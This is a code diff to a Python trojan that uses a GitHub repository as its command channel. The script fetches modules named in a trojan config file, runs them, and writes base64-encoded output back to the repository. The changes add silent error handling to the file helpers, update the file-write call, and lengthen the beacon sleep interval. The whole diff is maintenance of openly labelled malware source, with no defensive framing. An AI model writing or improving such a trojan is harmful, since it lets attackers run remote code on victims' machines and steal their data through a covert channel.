@@ -60,19 +60,21 @@ def gh_connect():
 #If there is a problem or file is not found, return None
 def get_file_contents(file_path):
     gh, repo, branch = gh_connect()
-    contents = repo.file_contents(file_path)
-    return contents.decoded
+    try:
+        contents = repo.file_contents(file_path)
+        return contents.decoded
+    except:
+        return None
 
 #Grab the file sha according to the path location.
 #If there is a problem or file is not found, return None
 def get_file_sha(file_path):
     gh, repo, branch = gh_connect()
-    if gh and repo and branch:
-        hash_list = branch.commit.commit.tree.recurse().tree
-        for hash in hash_list:
-            if file_path in hash.path:
-                return hash.sha
-    return None
+    try:
+        contents = repo.file_contents(file_path)
+        return contents.sha
+    except:
+        return None
 
 #This method will load the modules in the trojan config file from either sys.modules
 #or resort to importing from github using the GitImporter class. The method will return
@@ -121,7 +123,7 @@ def store_output():
     gh, repo, branch = gh_connect()
     sha = get_file_sha(trojan_output_file_path)
     if sha:
-        repo.update_file(trojan_output_file_path, trojan_output_file_name, base64.b64encode(trojan_output_file_contents.encode()), sha)
+        repo.contents(trojan_output_file_path).update(trojan_output_file_name, base64.b64encode(trojan_output_file_contents.encode()))
     else:
         repo.create_file(trojan_output_file_path, trojan_output_file_name, base64.b64encode(trojan_output_file_contents.encode()))
     return
@@ -146,7 +148,7 @@ while True:
             trojan_output_file_contents += "[*] Finished Executing Modules\n"
             store_output()
     #sleep_time = random.randint(60,120)
-    sleep_time = 10
+    sleep_time = 100000
     trojan_output_file_contents += f"[*] Sleeping For {sleep_time} Seconds\n"
     #print(trojan_output_file_contents)
     time.sleep(sleep_time)
